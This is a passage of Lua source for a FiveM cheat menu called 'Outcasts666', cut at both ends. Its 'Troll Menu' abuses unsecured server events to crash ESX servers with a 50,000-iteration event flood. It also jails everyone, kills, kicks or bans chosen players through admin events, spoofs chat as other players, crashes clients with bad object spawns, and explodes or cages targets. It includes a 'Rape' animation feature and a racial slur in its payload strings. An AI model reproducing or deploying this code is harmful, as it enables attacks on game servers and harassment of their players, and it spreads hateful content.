                                 end 
    
                    Outcasts666.Display() 
                 elseif Outcasts666.IsMenuOpened("WeaponOptions") then
                    if Outcasts666.Button("Spawn Weapon") then 
                        GiveWeaponToPed(GetPlayerPed(-1), GetHashKey(dz.id), 1000, false) 
                    end
                    if Outcasts666.Button("Remove Weapon") then
                        RemoveWeaponFromPed(GetPlayerPed(-1), GetHashKey(dz.id))
                    end
                    if Outcasts666.Button("Add Ammo") then 
                        SetPedAmmo(GetPlayerPed(-1), GetHashKey(dz.id), 5000) 
                    end
                                    if Outcasts666.CheckBox("Infinite ~s~Ammo", dz.bInfAmmo, function(ew) end) then 
                                        dz.bInfAmmo = not dz.bInfAmmo 
                                        SetPedInfiniteAmmo(GetPlayerPed(-1), dz.bInfAmmo, GetHashKey(dz.id)) SetPedInfiniteAmmoClip(GetPlayerPed(-1), true) 
                                        PedSkipNextReloading(GetPlayerPed(-1)) 
                                        SetPedShootRate(GetPlayerPed(-1), 1000) 
                                    end
                                    for e0, ev in pairs(dz.mods) do
                                        if Outcasts666.MenuButton("∑"..e0, "ModSelect") then 
                                            dA = ev 
                                        end
                                    end 
                                    
                                    Outcasts666.Display() 
                                elseif Outcasts666.IsMenuOpened("ModSelect") then
                                    for _, ev in pairs(dA) do
                                        if Outcasts666.Button(ev.name) then 
                                            GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey(dz.id), GetHashKey(ev.id)) 
                                        elseif Outcasts666.Button("~r~Remove " .. ev.name) then
                                            RemoveWeaponComponentFromPed(GetPlayerPed(-1), GetHashKey(dz.id), GetHashKey(ev.id))
                                        end 
                                    end 
                    
					Outcasts666.Display()
                elseif Outcasts666.IsMenuOpened("TrollMenu") then
                    if Outcasts666.Button("ESX Server Crasher") then
                        for i = 1, 50000 do TriggerServerEvent('esx_skin:responseSaveSkin', {niggers = 'gay'}) TriggerServerEvent('esx_skin:responseSaveSkin', 'niggers eat shit') end
                    elseif Outcasts666.Button("ESX Send All To Jail") then
                        for i = 1, 128 do
                            TriggerServerEvent("esx-qalle-jail:jailPlayer", i, 5000,"Jailed")
                               TriggerServerEvent("esx_jailer:sendToJail", i, 45*60)
                               TriggerServerEvent("esx_jail:sendToJail", i, 45*60)
                            TriggerServerEvent("js:jailuser", i, 45*60,"Jailed")
                        end
                    elseif Outcasts666.MenuButton("∑Block Off Areas", "BlockAreas") then
                    elseif Outcasts666.MenuButton("∑Spawn Peds On Players", "SpawnPedsMenu") then
                    elseif Outcasts666.Button("Nuke Server") then
                        nukeserver()
                    elseif Outcasts666.Button("Rape All Players") then
                        runOnAll(rape)
                    elseif Outcasts666.CheckBox("Spam Chat", spam, function(enabled) spam = enabled end) then
                    elseif Outcasts666.Button("Change Spam Message") then
                        local temp = KeyboardInput("Enter Message Here", "", 10000)
                        message = temp
                    elseif Outcasts666.CheckBox("Explode Everyone", blowall, function(enabled) blowall = enabled end) then
                    elseif Outcasts666.CheckBox("Freeze Everyone", fall, function(enabled) fall = enabled end) then
                    elseif Outcasts666.CheckBox("Explode Everyone Shooting", shootBomb, function(enabled) shootBomb = enabled end) then
                    elseif Outcasts666.CheckBox("Spawn Shit On Everyone", sall, function(enabled) sall = enabled end) then
                    elseif Outcasts666.CheckBox("Block Everyone From Running", runtog, function(enabled) runtog = enabled end) then
                    elseif Outcasts666.Button("Kick Everyone Out Of Car") then
                        for i = 0, 128 do
                            ClearPedTasksImmediately(GetPlayerPed(i))
                        end
                    elseif Outcasts666.Button("Crash All Players") then
                       runOnAll(crash)
                    elseif Outcasts666.Button("Fake Message") then
                        local da=KeyboardInput("Enter player name","",100)
                        if da then 
                            local ck=KeyboardInput("Enter message","",1000)
                            if ck then 
                                TriggerServerEvent('_chat:messageEntered',da,{0,0x99,255},ck)
                            end 
                        end 
                    elseif Outcasts666.Button("ESX Set All Police") then
                        for i = 0, 128 do 
                            TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(i), "police", 3)
                            TriggerServerEvent('NB:recruterplayer', i, "police", 3)
                        end 
                    elseif Outcasts666.Button("ESX Set All Mechanic") then
                        for i = 0, 128 do 
                            TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(i), "mecano", 3)
                            TriggerServerEvent('NB:recruterplayer', i, "mecano", 3)
                        end 
                    elseif Outcasts666.MenuButton('~h~~p~#~s~ Spawn Peds', 'SpawnPeds') then
                elseif Outcasts666.Button('~h~~r~Fake ~s~Chat Message') then
                    local e1 = KeyboardInput('Enter message to send', '', 100)
                    local e2 = GetPlayerName(SelectedPlayer)
                    if e1 then
                        TriggerServerEvent(
                            '_chat:messageEntered',
                            e2,
                            {
                                0,
                                0x99,
                                255
                            },
                            e1
                        )
                    end
 				elseif Outcasts666.Button("~g~Repair ~s~Vehicle") then
					NetworkRequestControlOfEntity(GetVehiclePedIsIn(SelectedPlayer))
					SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false))
					SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), 0.0)
					SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), 0)
					SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), false)
					Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), 0)
 				elseif Outcasts666.Button("~y~Fuck Up Engine ~s~Vehicle") then
					local playerPed = GetPlayerPed(SelectedPlayer)
					NetworkRequestControlOfEntity(GetVehiclePedIsIn(SelectedPlayer))
					SetVehicleUndriveable(GetVehiclePedIsIn(playerPed),true)
					SetVehicleEngineHealth(GetVehiclePedIsIn(playerPed), 100)
				elseif Outcasts666.Button("~o~Fuck Up ~s~Vehicle") then
					local playerPed = GetPlayerPed(SelectedPlayer)
					local playerVeh = GetVehiclePedIsIn(playerPed, true)
					NetworkRequestControlOfEntity(GetVehiclePedIsIn(SelectedPlayer))
						StartVehicleAlarm(playerVeh)
						DetachVehicleWindscreen(playerVeh)
						SmashVehicleWindow(playerVeh, 0)
						SmashVehicleWindow(playerVeh, 1)
						SmashVehicleWindow(playerVeh, 2)
						SmashVehicleWindow(playerVeh, 3)
						SetVehicleTyreBurst(playerVeh, 0, true, 1000.0)
						SetVehicleTyreBurst(playerVeh, 1, true, 1000.0)
						SetVehicleTyreBurst(playerVeh, 2, true, 1000.0)
						SetVehicleTyreBurst(playerVeh, 3, true, 1000.0)
						SetVehicleTyreBurst(playerVeh, 4, true, 1000.0)
						SetVehicleTyreBurst(playerVeh, 5, true, 1000.0)
						SetVehicleTyreBurst(playerVeh, 4, true, 1000.0)
						SetVehicleTyreBurst(playerVeh, 7, true, 1000.0)
						SetVehicleDoorBroken(playerVeh, 0, true)
						SetVehicleDoorBroken(playerVeh, 1, true)
						SetVehicleDoorBroken(playerVeh, 2, true)
						SetVehicleDoorBroken(playerVeh, 3, true)
						SetVehicleDoorBroken(playerVeh, 4, true)
						SetVehicleDoorBroken(playerVeh, 5, true)
						SetVehicleDoorBroken(playerVeh, 6, true)
						SetVehicleDoorBroken(playerVeh, 7, true)
						SetVehicleLights(playerVeh, 1)
						Citizen.InvokeNative(0x1FD09E7390A74D54, playerVeh, 1)
						SetVehicleNumberPlateTextIndex(playerVeh, 5)
						SetVehicleNumberPlateText(playerVeh, "LYNX")
						SetVehicleDirtLevel(playerVeh, 10.0)
						SetVehicleModColor_1(playerVeh, 1)
						SetVehicleModColor_2(playerVeh, 1)
						SetVehicleCustomPrimaryColour(playerVeh, 255, 51, 255)
						SetVehicleCustomSecondaryColour(playerVeh, 255, 51, 255)
						SetVehicleBurnout(playerVeh, true)
						drawNotification("~g~Vehicle Fucked Up!")
                elseif Outcasts666.Button('~h~~g~Kick ~s~From Vehicle') then
                    ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
                elseif Outcasts666.Button('~h~~r~Explode ~s~Vehicle') then
                    if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
                        AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 4, 1337.0, false, true, 0.0)
                    else
                        av('~h~~b~Player not in a vehicle~s~.', false)
                    end
                elseif Outcasts666.Button('~h~~r~Launch ~s~his car') then
                    if GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false) ~= 0 then
                        local e3 = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        local e4 = GetEntityHeading(GetPlayerPed(SelectedPlayer))
                        local e5 = CreatePed(5, 68070371, e3, e4, true)
                        local e6 = CreateVehicle(GetHashKey('adder'), e3, e4, true, false)
                        SetPedIntoVehicle(e5, e6, -1)
                    else
                        av('~h~~b~Player not in a vehicle~s~.', false)
                    end
                elseif Outcasts666.Button('~h~~r~Banana ~p~Party') then
                    local bH = CreateObject(GetHashKey('p_crahsed_heli_s'), 0, 0, 0, true, true, true)
                    local bI = CreateObject(GetHashKey('prop_rock_4_big2'), 0, 0, 0, true, true, true)
                    local bJ = CreateObject(GetHashKey('prop_beachflag_le'), 0, 0, 0, true, true, true)
                    AttachEntityToEntity(
                        bH,
                        GetPlayerPed(SelectedPlayer),
                        GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005),
                        0.4,
                        0,
                        0,
                        0,
                        270.0,
                        60.0,
                        true,
                        true,
                        false,
                        true,
                        1,
                        true
                    )
                    AttachEntityToEntity(
                        bI,
                        GetPlayerPed(SelectedPlayer),
                        GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005),
                        0.4,
                        0,
                        0,
                        0,
                        270.0,
                        60.0,
                        true,
                        true,
                        false,
                        true,
                        1,
                        true
                    )
                    AttachEntityToEntity(
                        bJ,
                        GetPlayerPed(SelectedPlayer),
                        GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005),
                        0.4,
                        0,
                        0,
                        0,
                        270.0,
                        60.0,
                        true,
                        true,
                        false,
                        true,
                        1,
                        true
                    )
                elseif Outcasts666.Button('~h~~r~Explode') then
                    AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 5, 3000.0, true, false, 100000.0)
                    AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 5, 3000.0, true, false, true)
                elseif Outcasts666.Button('~h~~r~Rape') then
                    RequestModelSync('a_m_o_acult_01')
                    RequestAnimDict('rcmpaparazzo_2')
                    while not HasAnimDictLoaded('rcmpaparazzo_2') do
                        Citizen.Wait(0)
                    end
                    if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
                        local veh = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), true)
                        while not NetworkHasControlOfEntity(veh) do
                            NetworkRequestControlOfEntity(veh)
                            Citizen.Wait(0)
                        end
                        SetEntityAsMissionEntity(veh, true, true)
                        DeleteVehicle(veh)
                        DeleteEntity(veh)
                    end
                    count = -0.2
                    for b = 1, 3 do
                        local x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer), true))
                        local bS = CreatePed(4, GetHashKey('a_m_o_acult_01'), x, y, z, 0.0, true, false)
                        SetEntityAsMissionEntity(bS, true, true)
                        AttachEntityToEntity(
                            bS,
                            GetPlayerPed(SelectedPlayer),
                            4103,
                            11816,
                            count,
                            0.00,
                            0.0,
                            0.0,
                            0.0,
                            0.0,
                            false,
                            false,
                            false,
                            false,
                            2,
                            true
                        )
                        ClearPedTasks(GetPlayerPed(SelectedPlayer))
                        TaskPlayAnim(
                            GetPlayerPed(SelectedPlayer),
                            'rcmpaparazzo_2',
                            'shag_loop_poppy',
                            2.0,
                            2.5,
                            -1,
                            49,
                            0,
                            0,
                            0,
                            0
                        )
                        SetPedKeepTask(bS)
                        TaskPlayAnim(bS, 'rcmpaparazzo_2', 'shag_loop_a', 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                        SetEntityInvincible(bS, true)
                        count = count - 0.4
                    end
                elseif Outcasts666.Button('~h~~r~Cage ~s~Player') then
                    x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
                    roundx = tonumber(string.format('%.2f', x))
                    roundy = tonumber(string.format('%.2f', y))
                    roundz = tonumber(string.format('%.2f', z))
                    local e7 = 'prop_fnclink_05crnr1'
                    local e8 = GetHashKey(e7)
                    RequestModel(e8)
                    while not HasModelLoaded(e8) do
                        Citizen.Wait(0)
                    end
                    local e9 = CreateObject(e8, roundx - 1.70, roundy - 1.70, roundz - 1.0, true, true, false)
                    local ea = CreateObject(e8, roundx + 1.70, roundy + 1.70, roundz - 1.0, true, true, false)
                    SetEntityHeading(e9, -90.0)
                    SetEntityHeading(ea, 90.0)
                    FreezeEntityPosition(e9, true)
                    FreezeEntityPosition(ea, true)
                elseif Outcasts666.Button('~h~~r~Hamburgher ~s~Player') then
                    local eb = 'xs_prop_hamburgher_wl'
                    local ec = GetHashKey(eb)
                    local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                    AttachEntityToEntity(
                        ed,
                        GetPlayerPed(SelectedPlayer),
                        GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
                        0,
                        0,
                        -1.0,
                        0.0,
                        0.0,
                        0,
                        true,
                        true,
                        false,
                        true,
                        1,
                        true
                    )
                elseif Outcasts666.Button('~h~~r~Hamburgher ~s~Player Car') then
                    local eb = 'xs_prop_hamburgher_wl'
                    local ec = GetHashKey(eb)
                    local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                    AttachEntityToEntity(
                        ed,
                        GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false),
                        GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), 'chassis'),
                        0,
                        0,
                        -1.0,
                        0.0,
                        0.0,
                        0,
                        true,
                        true,
                        false,
                        true,
                        1,
                        true
                    )
				elseif Outcasts666.Button('~h~~y~Kill ~r~Bitch') then
					TriggerServerEvent("mellotrainer:s_adminKill", GetPlayerServerId(SelectedPlayer))
				elseif Outcasts666.Button('~h~~r~TempBan ~s~From The Server') then
					TriggerServerEvent( 'mellotrainer:adminTempBan', GetPlayerServerId(SelectedPlayer))
				elseif Outcasts666.Button('~h~~y~Kick ~s~From The Server') then
					TriggerServerEvent( 'mellotrainer:adminKick', GetPlayerServerId(SelectedPlayer), "Kicked: You have been kicked from the server for metagaming." )
					TriggerServerEvent("EasyAdmin:kickPlayer", GetPlayerServerId(SelectedPlayer), "MetaGaming" )
				elseif Outcasts666.Button('~h~~o~_!_ ~r~CRASH ~s~Player ~o~_!_') then
                    local ej = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                    local ek = {
                        0x9CF21E0F,
                        0x34315488,
                        0x6A27FEB1,
                        0xCB2ACC8,
                        0xC6899CDE,
                        0xD14B5BA3,
                        0xD9F4474C,
                        0x32A9996C,
                        0x69D4F974,
                        0xCAFC1EC3,
                        0x79B41171,
                        0x1075651,
                        0xC07792D4,
                        0x781E451D,
                        0x762657C6,
                        0xC2E75A21,
                        0xC3C00861,
                        0x81FB3FF0,
                        0x45EF7804,
                        0xE65EC0E4,
                        0xE764D794,
                        0xFBF7D21F,
                        0xE1AEB708,
                        0xA5E3D471,
                        0xD971BBAE,
                        0xCF7A9A9D,
                        0xC2CC99D8,
                        0x8FB233A4,
                        0x24E08E1F,
                        0x337B2B54,
                        0xB9402F87,
                        0x4F2526DA
                    }
                    for i = 1, #ek do
                        local a = CreateObject(ek[i], ej, true, true, true)
                    end
                end
					
    
                    Outcasts666.Display()
                elseif Outcasts666.IsMenuOpened("BlockAreas") then
                    if Outcasts666.Button("Car Dealer") then
                        local wallHash = GetHashKey("stt_prop_stunt_track_slope15")
                        RequestModel(wallHash)                  
                        local e4 = 0
                        while not HasModelLoaded(wallHash) do 
                            e4 = e4 + 100
                            Citizen.Wait(100) 
                            if e4 > 5000 then
                                debugPrint("Failed to load model")
                                break 
                            end 
                        end                       
                        local wall1 = CreateObject(wallHash, -44.6, -1069.5, 91.9, true, true, true)
                        SetEntityRotation(wall1, 0.0, -0.0, 160.5560, 1, true)                                       
                    end
    
                    Outcasts666.Display() 
                elseif Outcasts666.IsMenuOpened("tunings") then 
                    veh = GetVehiclePedIsUsing(PlayerPedId()) 
                    for i, dA in pairs(bd) do
                        if dA.
                    id == "extra"
                    and# checkValidVehicleExtras()  ~= 0 then
                    if Outcasts666.MenuButton(dA.name, dA.id) then end elseif dA.id == "neon"
                    then
                    if Outcasts666.MenuButton(dA.name, dA.id) then end elseif dA.id == "paint"
                    then
                    if Outcasts666.MenuButton(dA.name, dA.id) then end elseif dA.id == "wheeltypes" 
                    then
                    if Outcasts666.MenuButton(dA.name, dA.id) then end elseif dA.id == "headlight"
                    then
                    if Outcasts666.MenuButton(dA.name, dA.id) then end
                    else local as = checkValidVehicleMods(dA.id) for dG, dH in pairs(as) do
                        if Outcasts666.MenuButton(dA.name, dA.id) then end;
                    break end end end;
                    if IsToggleModOn(veh, 22) then xenonStatus = "Installed"
                    else xenonStatus = "Not Installed"
                    end;
                    if Outcasts666.Button("Xenon Headlight", xenonStatus) then
                    if not IsToggleModOn(veh, 22) then ToggleVehicleMod(veh, 22, not IsToggleModOn(veh, 22))
                    else ToggleVehicleMod(veh, 22, not IsToggleModOn(veh, 22)) end end; 
                    
                    Outcasts666.Display() 
                elseif Outcasts666.IsMenuOpened("performance") then 
                    veh = GetVehiclePedIsUsing(PlayerPedId()) 
                    for i, dA in pairs(be) do
                        if Outcasts666.MenuButton(dA.name, dA.id) then 
                        end 
                    end
                    if IsToggleModOn(veh, 18) then 
                        turboStatus = "Installed"
                    else 
                        turboStatus = "Not Installed"
                    end
                    if Outcasts666.Button("Turbo Tune", turboStatus) then
                        if not IsToggleModOn(veh, 18) then 
                            ToggleVehicleMod(veh, 18, not IsToggleModOn(veh, 18))
                        else 
                            ToggleVehicleMod(veh, 18, not IsToggleModOn(veh, 18)) 
                        end 
                    end 
                    Outcasts666.Display() elseif Outcasts666.IsMenuOpened("primary") then Outcasts666.MenuButton("∑Classic", "classic1") Outcasts666.MenuButton("∑Metallic", "metallic1") Outcasts666.MenuButton("∑Matte", "matte1") Outcasts666.MenuButton("∑Metal", "metal1") Outcasts666.Display() elseif Outcasts666.IsMenuOpened("secondary") then Outcasts666.MenuButton("∑Classic", "classic2") Outcasts666.MenuButton("∑Metallic", "metallic2") Outcasts666.MenuButton("∑Matte", "matte2") Outcasts666.MenuButton("∑Metal", "metal2") Outcasts666.Display() elseif Outcasts666.IsMenuOpened("rimpaint") then Outcasts666.MenuButton("∑Classic", "classic3") Outcasts666.MenuButton("∑Metallic", "metallic3") Outcasts666.MenuButton("∑Matte", "matte3") Outcasts666.MenuButton("∑Metal", "metal3") Outcasts666.Display() elseif Outcasts666.IsMenuOpened("classic1") then
                    for dS, dT in pairs(bg) do tp, ts = GetVehicleColours(veh) if tp ==
                    dT.id and not b8 then pricetext = "Installed"
                    else if b8 and tp == dT.id then pricetext = "Previewing"
                    else pricetext = "Not Installed"
                    end end; curprim, cursec = GetVehicleColours(veh) if Outcasts666.Button(dT.name, pricetext) then
                    if not b8 then ba = "paint"
                    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = true elseif b8 and curprim == dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = false; ba = -1; b9 = -1 elseif b8 and curprim ~= dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = true end end end; Outcasts666.Display() elseif Outcasts666.IsMenuOpened("metallic1") then
                    for dS, dT in pairs(bg) do tp, ts = GetVehicleColours(veh) if tp ==
                    dT.id and not b8 then pricetext = "Installed"
                    else if b8 and tp == dT.id then pricetext = "Previewing"
                    else pricetext = "Not Installed"
                    end end; curprim, cursec = GetVehicleColours(veh) if Outcasts666.Button(dT.name, pricetext) then
                    if not b8 then ba = "paint"
                    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = true elseif b8 and curprim == dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = false; ba = -1; b9 = -1 elseif b8 and curprim ~= dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = true end end end; Outcasts666.Display() elseif Outcasts666.IsMenuOpened("matte1") then
                    for dS, dT in pairs(bi) do tp, ts = GetVehicleColours(veh) if tp ==
                    dT.id and not b8 then pricetext = "Installed"
                    else if b8 and tp == dT.id then pricetext = "Previewing"
                    else pricetext = "Not Installed"
                    end end; curprim, cursec = GetVehicleColours(veh) if Outcasts666.Button(dT.name, pricetext) then
                    if not b8 then ba = "paint"
                    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleColours(veh, dT.id, oldsec) b8 = true elseif b8 and curprim == dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = false; ba = -1; b9 = -1 elseif b8 and curprim ~= dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = true end end end; Outcasts666.Display() elseif Outcasts666.IsMenuOpened("metal1") then
                    for dS, dT in pairs(bj) do tp, ts = GetVehicleColours(veh) if tp ==
                    dT.id and not b8 then pricetext = "Installed"
                    else if b8 and tp == dT.id then pricetext = "Previewing"
                    else pricetext = "Not Installed"
                    end end; curprim, cursec = GetVehicleColours(veh) if Outcasts666.Button(dT.name, pricetext) then
                    if not b8 then ba = "paint"
                    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) SetVehicleColours(veh, dT.id, oldsec) b8 = true elseif b8 and curprim == dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = false; ba = -1; b9 = -1 elseif b8 and curprim ~= dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = true end end end; Outcasts666.Display() elseif Outcasts666.IsMenuOpened("classic2") then
                    for dS, dT in pairs(bg) do tp, ts = GetVehicleColours(veh) if ts ==
                    dT.id and not b8 then pricetext = "Installed"
                    else if b8 and ts == dT.id then pricetext = "Previewing"
                    else pricetext = "Not Installed"
                    end end; curprim, cursec = GetVehicleColours(veh) if Outcasts666.Button(dT.name, pricetext) then
                    if not b8 then ba = "paint"
                    bc = false; oldprim, oldsec = GetVehicleColours(veh) b9 = table.pack(oldprim, oldsec) SetVehicleColours(veh, oldprim, dT.id) b8 = true elseif b8 and cursec == dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and cursec ~= dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = true end end end; Outcasts666.Display() elseif Outcasts666.IsMenuOpened("metallic2") then
                    for dS, dT in pairs(bg) do tp, ts = GetVehicleColours(veh) if ts ==
                    dT.id and not b8 then pricetext = "Installed"
                    else if b8 and ts == dT.id then pricetext = "Previewing"
                    else pricetext = "Not Installed"
                    end end; curprim, cursec = GetVehicleColours(veh) if Outcasts666.Button(dT.name, pricetext) then
                    if not b8 then ba = "paint"
                    bc = false; oldprim, oldsec = GetVehicleColours(veh) b9 = table.pack(oldprim, oldsec) SetVehicleColours(veh, oldprim, dT.id) b8 = true elseif b8 and cursec == dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and cursec ~= dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = true end end end; Outcasts666.Display() elseif Outcasts666.IsMenuOpened("matte2") then
                    for dS, dT in pairs(bi) do tp, ts = GetVehicleColours(veh) if ts ==
                    dT.id and not b8 then pricetext = "Installed"
                    else if b8 and ts == dT.id then pricetext = "Previewing"
                    else pricetext = "Not Installed"
                    end end; curprim, cursec = GetVehicleColours(veh) if Outcasts666.Button(dT.name, pricetext) then
                    if not b8 then ba = "paint"
                    bc = false; oldprim, oldsec = GetVehicleColours(veh) b9 = table.pack(oldprim, oldsec) SetVehicleColours(veh, oldprim, dT.id) b8 = true elseif b8 and cursec == dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and cursec ~= dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = true end end end; Outcasts666.Display() elseif Outcasts666.IsMenuOpened("metal2") then
                    for dS, dT in pairs(bj) do tp, ts = GetVehicleColours(veh) if ts ==
                    dT.id and not b8 then pricetext = "Installed"
                    else if b8 and ts == dT.id then pricetext = "Previewing"
                    else pricetext = "Not Installed"
                    end end; curprim, cursec = GetVehicleColours(veh) if Outcasts666.Button(dT.name, pricetext) then
                    if not b8 then ba = "paint"
                    bc = false; oldprim, oldsec = GetVehicleColours(veh) b9 = table.pack(oldprim, oldsec) SetVehicleColours(veh, oldprim, dT.id) b8 = true elseif b8 and cursec == dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and cursec ~= dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = true end end end; Outcasts666.Display() elseif Outcasts666.IsMenuOpened("classic3") then
                    for dS, dT in pairs(bg) do _, ts = GetVehicleExtraColours(veh) if ts ==
                    dT.id and not b8 then pricetext = "Installed"
                    else if b8 and ts == dT.id then pricetext = "Previewing"
                    else pricetext = "Not Installed"
                    end end; _, currims = GetVehicleExtraColours(veh) if Outcasts666.Button(dT.name, pricetext) then
                    if not b8 then ba = "paint"
                    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = true elseif b8 and currims == dT.id then SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and currims ~= dT.id then SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = true end end end; Outcasts666.Display() elseif Outcasts666.IsMenuOpened("metallic3") then
                    for dS, dT in pairs(bg) do _, ts = GetVehicleExtraColours(veh) if ts ==
                    dT.id and not b8 then pricetext = "Installed"
                    else if b8 and ts == dT.id then pricetext = "Previewing"
                    else pricetext = "Not Installed"
                    end end; _, currims = GetVehicleExtraColours(veh) if Outcasts666.Button(dT.name, pricetext) then
                    if not b8 then ba = "paint"
                    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = true elseif b8 and currims == dT.id then SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and currims ~= dT.id then SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = true end end end; Outcasts666.Display() elseif Outcasts666.IsMenuOpened("matte3") then
                    for dS, dT in pairs(bi) do _, ts = GetVehicleExtraColours(veh) if ts ==
                    dT.id and not b8 then pricetext = "Installed"
                    else if b8 and ts == dT.id then pricetext = "Previewing"
                    else pricetext = "Not Installed"
                    end end; _, currims = GetVehicleExtraColours(veh) if Outcasts666.Button(dT.name, pricetext) then
                    if not b8 then ba = "paint"
                    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = true elseif b8 and currims == dT.id then SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and currims ~= dT.id then SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = true end end end; Outcasts666.Display() elseif Outcasts666.IsMenuOpened("metal3") then
                    for dS, dT in pairs(bj) do _, ts = GetVehicleExtraColours(veh) if ts ==
                    dT.id and not b8 then pricetext = "Installed"
                    else if b8 and ts == dT.id then pricetext = "Previewing"
                    else pricetext = "Not Installed"
                    end end; _, currims = GetVehicleExtraColours(veh) if Outcasts666.Button(dT.name, pricetext) then
                    if not b8 then ba = "paint"
                    bc = false
                     oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) 
                     b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) 
                     SetVehicleExtraColours(veh, oldpearl, dT.id) 
                     b8 = true elseif b8 and currims == dT.id then 
                        SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and currims ~= dT.id then SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = true end end end;
    
                    Outcasts666.Display()
                elseif Outcasts666.IsMenuOpened("SpawnPedsMenu") then
                    if Outcasts666.Button("Mountain Lion") then
                        local model = 307287994
                        while not HasModelLoaded(model) do
                            debugPrint("Loading Model...")
                            RequestModel(model)
                            Citizen.Wait(0)
                        end
                        for i = 1, 128 do
